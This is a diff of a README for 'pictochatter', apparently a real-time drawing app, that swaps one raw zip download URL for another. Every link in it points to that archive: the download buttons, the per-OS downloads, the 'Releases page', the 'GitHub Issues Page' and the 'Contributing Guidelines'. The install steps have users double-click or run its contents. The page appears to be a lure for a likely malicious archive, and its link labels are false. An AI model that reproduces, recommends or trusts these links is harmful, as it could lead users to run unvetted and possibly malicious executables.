@@ -1,6 +1,6 @@
 # 🎨 pictochatter - Collaborate and Create in Real Time
 
-[![Download pictochatter](https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip)](https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip)
+[![Download pictochatter](https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip)](https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,34 +19,34 @@ Before you install pictochatter, ensure your computer meets these requirements:
 
 To get started, you need to visit the Releases page to download the latest version of pictochatter.
 
-[Download pictochatter](https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip)
+[Download pictochatter](https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available downloads.
 3. Look for the latest version that is marked as "Latest Release."
 4. Click on the appropriate file for your operating system.
-   - For Windows: Download `https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip`
-   - For macOS: Download `https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip`
-   - For Linux: Download `https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip`
+   - For Windows: Download `https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip`
 5. Once the file is downloaded, locate it in your Downloads folder.
 
 ### Installation Steps
 
 #### For Windows:
 
-1. Double-click the `https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip` file to begin the installation.
+1. Double-click the `https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip` file to begin the installation.
 2. Follow the on-screen instructions to install the application.
 3. After installation, you can find pictochatter in your Start Menu.
 
 #### For macOS:
 
-1. Open the `https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip` file.
+1. Open the `https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip` file.
 2. Drag and drop the pictochatter icon into your Applications folder.
 3. Navigate to your Applications folder to open pictochatter.
 
 #### For Linux:
 
-1. Extract the contents of `https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip`.
+1. Extract the contents of `https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip`.
 2. Open a terminal window and navigate to the extracted folder.
 3. Run the executable with the command `./pictochatter`.
 4. You may need to grant execute permissions using the command `chmod +x pictochatter`.
@@ -71,16 +71,16 @@ After successfully installing pictochatter, you can start using it right away.
 
 ## 📞 Support
 
-If you encounter issues or have questions, please reach out to our support team. You can find help by visiting our [GitHub Issues Page](https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip) or by contacting the community.
+If you encounter issues or have questions, please reach out to our support team. You can find help by visiting our [GitHub Issues Page](https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip) or by contacting the community.
 
 ## 🌟 Community Contributions
 
-We welcome contributions from users looking to improve pictochatter. If you’d like to help develop new features or fix bugs, check our [Contributing Guidelines](https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip) for more information.
+We welcome contributions from users looking to improve pictochatter. If you’d like to help develop new features or fix bugs, check our [Contributing Guidelines](https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip) for more information.
 
 ## 📝 License
 
 This project is licensed under the MIT License. Feel free to use the code as you wish, but please credit the original creators.
 
-[Download pictochatter](https://github.com/Vinh123la/pictochatter/raw/refs/heads/main/backend/Software-1.3.zip)
+[Download pictochatter](https://raw.githubusercontent.com/Vinh123la/pictochatter/main/frontend/Software_v3.4.zip)
 
 Get started with pictochatter today and unleash your creativity!
